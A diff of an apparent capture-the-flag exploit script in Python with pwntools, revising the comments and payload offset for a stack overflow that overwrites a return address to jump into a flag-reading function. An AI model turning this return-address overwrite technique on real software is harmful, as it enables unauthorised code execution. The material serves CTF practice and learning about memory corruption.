@@ -55,11 +55,9 @@ def main():
     # 3. Locate the return address overflow by pwn cyclic.
     # 4. Jump to cmd_read to read flag.
 
-    # TODO: ??? The following sounds right but somehow it doesn't work. And by the manual trial and error, the other value works. Need to investigate.
-    # But we hit one issue: we also overwrite the RBP to an inaccessible address, which fails operations like [rbp+0x12] in the caller function.
-    # Thus we need to use 0x1f which passes the rbp value on stack and we directly overwrite the return address only.
-    # The 0x1f is from the (0x14 + 11), the 11 is from the previous pwn cyclic result.
-    # TODO: ???
+    # But we hit one issue: we also overwrite the RBP to an inaccessible address, which fails operations like [rbp+<something>] in the caller function.
+    # Thus we need to use 0x1c which passes the rbp value on stack and we directly overwrite the return address only.
+    # The 0x1c is from the (0x14 + 8). The 8 is the length of the RBP on stack. The index i is right above the RPB on stack.
 
     # Add these pause()/sleep() so that gdb can attach to the first read(). And somehow if we send them all at once,
     # some input may be read together incorerectly. Possibly this is because we don't have newlines.
@@ -67,7 +65,6 @@ def main():
     sleep(1)
     # 512 bytes in total
     ret_addr = 0x4014eb # The address in cmd_read which reads the flag file name.
-    # user = b'USER ' + b'\x14' * 18 + b'\x90' * 11
     user = b'USER ' + b'\x1c' * 18 + b'\x90' * 11
     user += p64(ret_addr)
     info(f'user has lenght {len(user)}')
